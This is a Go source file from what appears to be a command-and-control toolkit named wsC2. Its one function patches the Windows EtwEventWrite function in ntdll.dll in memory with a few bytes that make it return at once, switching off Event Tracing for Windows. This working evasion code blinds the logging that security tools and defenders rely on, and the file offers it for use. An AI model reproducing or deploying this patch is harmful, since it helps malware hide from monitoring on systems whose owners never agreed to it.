package patchetw

import (
	"syscall"
	"unsafe"

	"github.com/latortuga71/wsC2/pkg/winapi"
	"golang.org/x/sys/windows"
)

func PatchEtw() (string, error) {
	patch := make([]byte, 6)
	// push pop push pop nop ret
	patch[0] = 0x50
	patch[1] = 0x58
	patch[2] = 0x53
	patch[3] = 0x5B
	patch[4] = 0x90
	patch[5] = 0xC3
	patchLen := len(patch)
	var oldProtect uint32
	lib, err := windows.LoadLibrary("ntdll.dll")
	if err != nil {
		return "", err
	}
	addy, err := windows.GetProcAddress(lib, "EtwEventWrite")
	if err != nil {
		return "", err
	}
	err = windows.VirtualProtect(addy, unsafe.Sizeof(patch), 0x40, &oldProtect)
	if err != nil {
		return "", err
	}
	var nBytesWritten *uint32
	hProc, err := windows.GetCurrentProcess()
	if err != nil {
		return "", err
	}
	writeMem, err := winapi.WriteProcessMemory(
		syscall.Handle(hProc),
		addy,
		(uintptr)(unsafe.Pointer(&patch[0])),
		uint32(patchLen),
		nBytesWritten)
	if !writeMem {
		return "", err
	}
	err = windows.VirtualProtect(addy, unsafe.Sizeof(patch), oldProtect, &oldProtect)
	if err != nil {
		return "", err
	}
	return "Successfully Patched E.T.W.", nil
}
